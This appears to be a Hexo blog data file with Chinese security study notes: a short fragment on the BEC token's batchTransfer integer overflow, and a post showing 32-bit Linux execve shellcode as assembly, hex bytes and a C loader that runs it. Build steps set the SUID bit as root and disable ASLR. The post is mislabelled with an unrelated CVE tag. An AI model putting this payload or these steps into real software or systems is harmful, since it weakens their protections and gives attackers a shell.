20是以太坊的代币的一个标准，规范了所有发行的合约应该实现的功能和遵循的接口。（Ethereum Request for Comments）</p>\n</li>\n<li><p>美链中有一个叫做batchTransfer的函数，功能是向多个接收者发送代币，把这些代币从调用者里面扣除。<br><img src=\"/../pic/Pasted%20image%2020240731231353.png\"></p>\n</li>\n<li><p>数据乘法溢出。</p>\n</li>\n<li><p>发送的很多。</p>\n</li>\n<li><p>减少的很少。</p>\n</li>\n</ul>\n<h1 id=\"考虑是不是溢出\"><a href=\"#考虑是不是溢出\" class=\"headerlink\" title=\"考虑是不是溢出\"></a>考虑是不是溢出</h1><h1 id=\"safemath库自动判断是否溢出\"><a href=\"#safemath库自动判断是否溢出\" class=\"headerlink\" title=\"safemath库自动判断是否溢出\"></a>safemath库自动判断是否溢出</h1>","excerpt":"","more":"<h1 id=\"美链-一种代币\"><a href=\"#美链-一种代币\" class=\"headerlink\" title=\"美链(一种代币)\"></a>美链(一种代币)</h1><ul>\n<li><p>只是一个智能合约。</p>\n</li>\n<li><p>有自己的代币BEC.</p>\n</li>\n<li><p>ICO(Initial Coin offering)</p>\n</li>\n<li><p>没有自己的链，代币的交易都是通过智能合约的函数来实现的。</p>\n</li>\n<li><p>可以自定义规则，每个账户有多少代币存储在智能合约的状态变量里面。</p>\n</li>\n<li><p>ERC 20是以太坊的代币的一个标准，规范了所有发行的合约应该实现的功能和遵循的接口。（Ethereum Request for Comments）</p>\n</li>\n<li><p>美链中有一个叫做batchTransfer的函数，功能是向多个接收者发送代币，把这些代币从调用者里面扣除。<br><img src=\"/../pic/Pasted%20image%2020240731231353.png\"></p>\n</li>\n<li><p>数据乘法溢出。</p>\n</li>\n<li><p>发送的很多。</p>\n</li>\n<li><p>减少的很少。</p>\n</li>\n</ul>\n<h1 id=\"考虑是不是溢出\"><a href=\"#考虑是不是溢出\" class=\"headerlink\" title=\"考虑是不是溢出\"></a>考虑是不是溢出</h1><h1 id=\"safemath库自动判断是否溢出\"><a href=\"#safemath库自动判断是否溢出\" class=\"headerlink\" title=\"safemath库自动判断是否溢出\"></a>safemath库自动判断是否溢出</h1>"},{"title":"ShellCode","date":"2024-07-29T01:04:16.000Z","_content":"# ubuntu(16 32位)\n# 概述\n\n## 什么是shellcode\n\nshellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode**机器码**，让电脑可以执行攻击者的任意指令。\n## 汇编码与机器码\n\n### 机器码\n\n可以直接在CPU运行的代码，一般就是可以用二进制代码来展示。\n### 汇编码\n\n就是币机器码高级一点的语言，通过基本的语言实现操作系统的基础功能。\n# shellcode代码\n\n## 汇编代码(目标机32bit的ubuntu16)\n\n```asm\nsection .text\nsection .text\n    global _start\n\n_start:\n    xor eax, eax\n    push eax\n    push 0x68732f2f\n    push 0x6e69622f\n    mov ebx, esp\n    push eax\n    push ebx\n    mov ecx, esp\n    xor edx, edx\n    mov al, 0xb\n    int 0x80\n```\n\n## 使用汇编码\n\n### 1.上述代码保存为文件（shellcode.asm）\n\n```shell\nvim shellcode.asm\n```\n\n### 2.进行汇编\n\n```shell\nnasm -f elf32 shellcode.asm -o shellcode.o\n```\n### 3.进行链接\n\n```shell\nld -m elf_i386 shellcode.o -o shellcode\n```\n\n### 4.**设置SUID位（可选）**    \n\n以root权限执行\n```shell\nsudo chown root:root shellcode\nsudo chmod u+s shellcode\n```\n### 5.**禁用ASLR（可选）**\n\n```shell\nsudo sysctl -w kernel.randomize_va_space=0\n```\n\n### 6.运行可执行文件\n\n```shell\n./shellcode\n```\n\n## 汇编代码转为机器码\n\n### 编译为二进制文件\n\n```shell\nnasm -f bin shellcode.asm -o shellcode.bin\n```\n### 查看机器码并转为所需格式\n\n```shell\nxxd -p shellcode.bin | sed 's/\\(..\\)/\\\\x\\1/g' | fold -w 48\n```\n## 16进制机器码\n\n```shellcode\n\\x66\\x31\\xc0\\x66\\x50\\x66\\xbb\\x2f\\x2f\\x73\\x68\\x66\n\\x53\\x66\\xbb\\x2f\\x62\\x69\\x6e\\x66\\x53\\x66\\x89\\xe3\n\\x66\\x50\\x66\\x53\\x66\\x89\n\\xe1\\x66\\x31\\xd2\\xb0\\x0b\\xcd\\x80\n```\n\n## C语言使用机器码\n\n### 代码\n```c\n#include <stdio.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <unistd.h>\n\n// Shellcode\nunsigned char shellcode[] = \n\"\\x31\\xc0\\x50\\xbb\\x2f\\x2f\\x73\\x68\\x53\\xbb\\x2f\\x62\\x69\\x6e\\x53\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\";\n\nint main() {\n    // Print shellcode length\n    printf(\"Shellcode Length: %ld\\n\", strlen(shellcode));\n\n    // Allocate executable memory\n    void *exec = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (exec == MAP_FAILED) {\n        perror(\"mmap\");\n        return 1;\n    }\n\n    // Copy shellcode to allocated memory\n    memcpy(exec, shellcode, sizeof(shellcode));\n\n    // Execute shellcode\n    void (*execute_shellcode)() = (void (*)())exec;\n    execute_shellcode();\n\n    // Cleanup\n    munmap(exec, sizeof(shellcode));\n\n    return 0;\n}\n```\n\n### 编译\n使用 `-z execstack` 编译选项来允许执行堆栈上的代码:\n```shell\ngcc -z execstack -o shellcode shellcode.c\n```\n\n\n\n## 执行结果\n\n- 开启shell窗口。\n\n","source":"_posts/shellcode.md","raw":"---\ntitle: ShellCode\ndate: 2024-07-29 09:04:16\ntags:\n  - CVE\ncategories:\n  - CVE\n  - CVE-2024-6387\n---\n# ubuntu(16 32位)\n# 概述\n\n## 什么是shellcode\n\nshellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode**机器码**，让电脑可以执行攻击者的任意指令。\n## 汇编码与机器码\n\n### 机器码\n\n可以直接在CPU运行的代码，一般就是可以用二进制代码来展示。\n### 汇编码\n\n就是币机器码高级一点的语言，通过基本的语言实现操作系统的基础功能。\n# shellcode代码\n\n## 汇编代码(目标机32bit的ubuntu16)\n\n```asm\nsection .text\nsection .text\n    global _start\n\n_start:\n    xor eax, eax\n    push eax\n    push 0x68732f2f\n    push 0x6e69622f\n    mov ebx, esp\n    push eax\n    push ebx\n    mov ecx, esp\n    xor edx, edx\n    mov al, 0xb\n    int 0x80\n```\n\n## 使用汇编码\n\n### 1.上述代码保存为文件（shellcode.asm）\n\n```shell\nvim shellcode.asm\n```\n\n### 2.进行汇编\n\n```shell\nnasm -f elf32 shellcode.asm -o shellcode.o\n```\n### 3.进行链接\n\n```shell\nld -m elf_i386 shellcode.o -o shellcode\n```\n\n### 4.**设置SUID位（可选）**    \n\n以root权限执行\n```shell\nsudo chown root:root shellcode\nsudo chmod u+s shellcode\n```\n### 5.**禁用ASLR（可选）**\n\n```shell\nsudo sysctl -w kernel.randomize_va_space=0\n```\n\n### 6.运行可执行文件\n\n```shell\n./shellcode\n```\n\n## 汇编代码转为机器码\n\n### 编译为二进制文件\n\n```shell\nnasm -f bin shellcode.asm -o shellcode.bin\n```\n### 查看机器码并转为所需格式\n\n```shell\nxxd -p shellcode.bin | sed 's/\\(..\\)/\\\\x\\1/g' | fold -w 48\n```\n## 16进制机器码\n\n```shellcode\n\\x66\\x31\\xc0\\x66\\x50\\x66\\xbb\\x2f\\x2f\\x73\\x68\\x66\n\\x53\\x66\\xbb\\x2f\\x62\\x69\\x6e\\x66\\x53\\x66\\x89\\xe3\n\\x66\\x50\\x66\\x53\\x66\\x89\n\\xe1\\x66\\x31\\xd2\\xb0\\x0b\\xcd\\x80\n```\n\n## C语言使用机器码\n\n### 代码\n```c\n#include <stdio.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <unistd.h>\n\n// Shellcode\nunsigned char shellcode[] = \n\"\\x31\\xc0\\x50\\xbb\\x2f\\x2f\\x73\\x68\\x53\\xbb\\x2f\\x62\\x69\\x6e\\x53\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\";\n\nint main() {\n    // Print shellcode length\n    printf(\"Shellcode Length: %ld\\n\", strlen(shellcode));\n\n    // Allocate executable memory\n    void *exec = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (exec == MAP_FAILED) {\n        perror(\"mmap\");\n        return 1;\n    }\n\n    // Copy shellcode to allocated memory\n    memcpy(exec, shellcode, sizeof(shellcode));\n\n    // Execute shellcode\n    void (*execute_shellcode)() = (void (*)())exec;\n    execute_shellcode();\n\n    // Cleanup\n    munmap(exec, sizeof(shellcode));\n\n    return 0;\n}\n```\n\n### 编译\n使用 `-z execstack` 编译选项来允许执行堆栈上的代码:\n```shell\ngcc -z execstack -o shellcode shellcode.c\n```\n\n\n\n## 执行结果\n\n- 开启shell窗口。\n\n","slug":"shellcode","published":1,"updated":"2024-07-31T16:00:08.890Z","comments":1,"layout":"post","photos":[],"_id":"clzbh821600002sundcwrhcyf","content":"<h1 id=\"ubuntu-16-32位\"><a href=\"#ubuntu-16-32位\" class=\"headerlink\" title=\"ubuntu(16 32位)\"></a>ubuntu(16 32位)</h1><h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><h2 id=\"什么是shellcode\"><a href=\"#什么是shellcode\" class=\"headerlink\" title=\"什么是shellcode\"></a>什么是shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。</p>\n<h2 id=\"汇编码与机器码\"><a href=\"#汇编码与机器码\" class=\"headerlink\" title=\"汇编码与机器码\"></a>汇编码与机器码</h2><h3 id=\"机器码\"><a href=\"#机器码\" class=\"headerlink\" title=\"机器码\"></a>机器码</h3><p>可以直接在CPU运行的代码，一般就是可以用二进制代码来展示。</p>\n<h3 id=\"汇编码\"><a href=\"#汇编码\" class=\"headerlink\" title=\"汇编码\"></a>汇编码</h3><p>就是币机器码高级一点的语言，通过基本的语言实现操作系统的基础功能。</p>\n<h1 id=\"shellcode代码\"><a href=\"#shellcode代码\" class=\"headerlink\" title=\"shellcode代码\"></a>shellcode代码</h1><h2 id=\"汇编代码-目标机32bit的ubuntu16\"><a href=\"#汇编代码-目标机32bit的ubuntu16\" class=\"headerlink\" title=\"汇编代码(目标机32bit的ubuntu16)\"></a>汇编代码(目标机32bit的ubuntu16)</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asm\">section .text<br>section .text<br>    global _start<br><br>_start:<br>    xor eax, eax<br>    push eax<br>    push 0x68732f2f<br>    push 0x6e69622f<br>    mov ebx, esp<br>    push eax<br>    push ebx<br>    mov ecx, esp<br>    xor edx, edx<br>    mov al, 0xb<br>    int 0x80<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"使用汇编码\"><a href=\"#使用汇编码\" class=\"headerlink\" title=\"使用汇编码\"></a>使用汇编码</h2><h3 id=\"1-上述代码保存为文件（shellcode-asm）\"><a href=\"#1-上述代码保存为文件（shellcode-asm）\" class=\"headerlink\" title=\"1.上述代码保存为文件（shellcode.asm）\"></a>1.上述代码保存为文件（shellcode.asm）</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">vim shellcode.asm<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-进行汇编\"><a href=\"#2-进行汇编\" class=\"headerlink\" title=\"2.进行汇编\"></a>2.进行汇编</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">nasm -f elf32 shellcode.asm -o shellcode.o<br></code></pre></td></tr></table></figure>\n<h3 id=\"3-进行链接\"><a href=\"#3-进行链接\" class=\"headerlink\" title=\"3.进行链接\"></a>3.进行链接</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">ld -m elf_i386 shellcode.o -o shellcode<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-设置SUID位（可选）\"><a href=\"#4-设置SUID位（可选）\" class=\"headerlink\" title=\"4.设置SUID位（可选）\"></a>4.<strong>设置SUID位（可选）</strong></h3><p>以root权限执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo chown root:root shellcode<br>sudo chmod u+s shellcode<br></code></pre></td></tr></table></figure>\n<h3 id=\"5-禁用ASLR（可选）\"><a href=\"#5-禁用ASLR（可选）\" class=\"headerlink\" title=\"5.禁用ASLR（可选）\"></a>5.<strong>禁用ASLR（可选）</strong></h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-运行可执行文件\"><a href=\"#6-运行可执行文件\" class=\"headerlink\" title=\"6.运行可执行文件\"></a>6.运行可执行文件</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">./shellcode<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"汇编代码转为机器码\"><a href=\"#汇编代码转为机器码\" class=\"headerlink\" title=\"汇编代码转为机器码\"></a>汇编代码转为机器码</h2><h3 id=\"编译为二进制文件\"><a href=\"#编译为二进制文件\" class=\"headerlink\" title=\"编译为二进制文件\"></a>编译为二进制文件</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">nasm -f bin shellcode.asm -o shellcode.bin<br></code></pre></td></tr></table></figure>\n<h3 id=\"查看机器码并转为所需格式\"><a href=\"#查看机器码并转为所需格式\" class=\"headerlink\" title=\"查看机器码并转为所需格式\"></a>查看机器码并转为所需格式</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">xxd -p shellcode.bin | sed &#x27;s/\\(..\\)/\\\\x\\1/g&#x27; | fold -w 48<br></code></pre></td></tr></table></figure>\n<h2 id=\"16进制机器码\"><a href=\"#16进制机器码\" class=\"headerlink\" title=\"16进制机器码\"></a>16进制机器码</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shellcode\">\\x66\\x31\\xc0\\x66\\x50\\x66\\xbb\\x2f\\x2f\\x73\\x68\\x66<br>\\x53\\x66\\xbb\\x2f\\x62\\x69\\x6e\\x66\\x53\\x66\\x89\\xe3<br>\\x66\\x50\\x66\\x53\\x66\\x89<br>\\xe1\\x66\\x31\\xd2\\xb0\\x0b\\xcd\\x80<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"C语言使用机器码\"><a href=\"#C语言使用机器码\" class=\"headerlink\" title=\"C语言使用机器码\"></a>C语言使用机器码</h2><h3 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/mman.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;unistd.h&gt;</span></span><br><br><span class=\"hljs-comment\">// Shellcode</span><br><span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">char</span> shellcode[] = <br><span class=\"hljs-string\">&quot;\\x31\\xc0\\x50\\xbb\\x2f\\x2f\\x73\\x68\\x53\\xbb\\x2f\\x62\\x69\\x6e\\x53\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80&quot;</span>;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;<br>    <span class=\"hljs-comment\">// Print shellcode length</span><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Shellcode Length: %ld\\n&quot;</span>, <span class=\"hljs-built_in\">strlen</span>(shellcode));<br><br>    <span class=\"hljs-comment\">// Allocate executable memory</span><br>    <span class=\"hljs-type\">void</span> *exec = mmap(<span class=\"hljs-number\">0</span>, <span class=\"hljs-keyword\">sizeof</span>(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class=\"hljs-number\">-1</span>, <span class=\"hljs-number\">0</span>);<br>    <span class=\"hljs-keyword\">if</span> (exec == MAP_FAILED) &#123;<br>        perror(<span class=\"hljs-string\">&quot;mmap&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>    &#125;<br><br>    <span class=\"hljs-comment\">// Copy shellcode to allocated memory</span><br>    <span class=\"hljs-built_in\">memcpy</span>(exec, shellcode, <span class=\"hljs-keyword\">sizeof</span>(shellcode));<br><br>    <span class=\"hljs-comment\">// Execute shellcode</span><br>    <span class=\"hljs-type\">void</span> (*execute_shellcode)() = (<span class=\"hljs-type\">void</span> (*)())exec;<br>    execute_shellcode();<br><br>    <span class=\"hljs-comment\">// Cleanup</span><br>    munmap(exec, <span class=\"hljs-keyword\">sizeof</span>(shellcode));<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h3><p>使用 <code>-z execstack</code> 编译选项来允许执行堆栈上的代码:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">gcc -z execstack -o shellcode shellcode.c<br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"执行结果\"><a href=\"#执行结果\" class=\"headerlink\" title=\"执行结果\"></a>执行结果</h2><ul>\n<li>开启shell窗口。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"ubuntu-16-32位\"><a href=\"#ubuntu-16-32位\" class=\"headerlink\" title=\"ubuntu(16 32位)\"></a>ubuntu(16 32位)</h1><h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><h2 id=\"什么是shellcode\"><a href=\"#什么是shellcode\" class=\"headerlink\" title=\"什么是shellcode\"></a>什么是shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。</p>\n<h2 id=\"汇编码与机器码\"><a href=\"#汇编码与机器码\" class=\"headerlink\" title=\"汇编码与机器码\"></a>汇编码与机器码</h2><h3 id=\"机器码\"><a href=\"#机器码\" class=\"headerlink\" title=\"机器码\"></a>机器码</h3><p>可以直接在CPU运行的代码，一般就是可以用二进制代码来展示。</p>\n<h3 id=\"汇编码\"><a href=\"#汇编码\" class=\"headerlink\" title=\"汇编码\"></a>汇编码</h3><p>就是币机器码高级一点的语言，通过基本的语言实现操作系统的基础功能。</p>\n<h1 id=\"shellcode代码\"><a href=\"#shellcode代码\" class=\"headerlink\" title=\"shellcode代码\"></a>shellcode代码</h1><h2 id=\"汇编代码-目标机32bit的ubuntu16\"><a href=\"#汇编代码-目标机32bit的ubuntu16\" class=\"headerlink\" title=\"汇编代码(目标机32bit的ubuntu16)\"></a>汇编代码(目标机32bit的ubuntu16)</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asm\">section .text<br>section .text<br>    global _start<br><br>_start:<br>    xor eax, eax<br>    push eax<br>    push 0x68732f2f<br>    push 0x6e69622f<br>    mov ebx, esp<br>    push eax<br>    push ebx<br>    mov ecx, esp<br>    xor edx, edx<br>    mov al, 0xb<br>    int 0x80<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"使用汇编码\"><a href=\"#使用汇编码\" class=\"headerlink\" title=\"使用汇编码\"></a>使用汇编码</h2><h3 id=\"1-上述代码保存为文件（shellcode-asm）\"><a href=\"#1-上述代码保存为文件（shellcode-asm）\" class=\"headerlink\" title=\"1.上述代码保存为文件（shellcode.asm）\"></a>1.上述代码保存为文件（shellcode.asm）</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">vim shellcode.asm<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-进行汇编\"><a href=\"#2-进行汇编\" class=\"headerlink\" title=\"2.进行汇编\"></a>2.进行汇编</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">nasm -f elf32 shellcode.asm -o shellcode.o<br></code></pre></td></tr></table></figure>\n<h3 id=\"3-进行链接\"><a href=\"#3-进行链接\" class=\"headerlink\" title=\"3.进行链接\"></a>3.进行链接</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">ld -m elf_i386 shellcode.o -o shellcode<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-设置SUID位（可选）\"><a href=\"#4-设置SUID位（可选）\" class=\"headerlink\" title=\"4.设置SUID位（可选）\"></a>4.<strong>设置SUID位（可选）</strong></h3><p>以root权限执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo chown root:root shellcode<br>sudo chmod u+s shellcode<br></code></pre></td></tr></table></figure>\n<h3 id=\"5-禁用ASLR（可选）\"><a href=\"#5-禁用ASLR（可选）\" class=\"headerlink\" title=\"5.禁用ASLR（可选）\"></a>5.<strong>禁用ASLR（可选）</strong></h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-运行可执行文件\"><a href=\"#6-运行可执行文件\" class=\"headerlink\" title=\"6.运行可执行文件\"></a>6.运行可执行文件</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">./shellcode<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"汇编代码转为机器码\"><a href=\"#汇编代码转为机器码\" class=\"headerlink\" title=\"汇编代码转为机器码\"></a>汇编代码转为机器码</h2><h3 id=\"编译为二进制文件\"><a href=\"#编译为二进制文件\" class=\"headerlink\" title=\"编译为二进制文件\"></a>编译为二进制文件</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">nasm -f bin shellcode.asm -o shellcode.bin<br></code></pre></td></tr></table></figure>\n<h3 id=\"查看机器码并转为所需格式\"><a href=\"#查看机器码并转为所需格式\" class=\"headerlink\" title=\"查看机器码并转为所需格式\"></a>查看机器码并转为所需格式</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">xxd -p shellcode.bin | sed &#x27;s/\\(..\\)/\\\\x\\1/g&#x27; | fold -w 48<br></code></pre></td></tr></table></figure>\n<h2 id=\"16进制机器码\"><a href=\"#16进制机器码\" class=\"headerlink\" title=\"16进制机器码\"></a>16进制机器码</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shellcode\">\\x66\\x31\\xc0\\x66\\x50\\x66\\xbb\\x2f\\x2f\\x73\\x68\\x66<br>\\x53\\x66\\xbb\\x2f\\x62\\x69\\x6e\\x66\\x53\\x66\\x89\\xe3<br>\\x66\\x50\\x66\\x53\\x66\\x89<br>\\xe1\\x66\\x31\\xd2\\xb0\\x0b\\xcd\\x80<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"C语言使用机器码\"><a href=\"#C语言使用机器码\" class=\"headerlink\" title=\"C语言使用机器码\"></a>C语言使用机器码</h2><h3 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/mman.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;unistd.h&gt;</span></span><br><br><span class=\"hljs-comment\">// Shellcode</span><br><span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">char</span> shellcode[] = <br><span class=\"hljs-string\">&quot;\\x31\\xc0\\x50\\xbb\\x2f\\x2f\\x73\\x68\\x53\\xbb\\x2f\\x62\\x69\\x6e\\x53\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80&quot;</span>;<br><br><span class=\"hljs-type\">int</span> 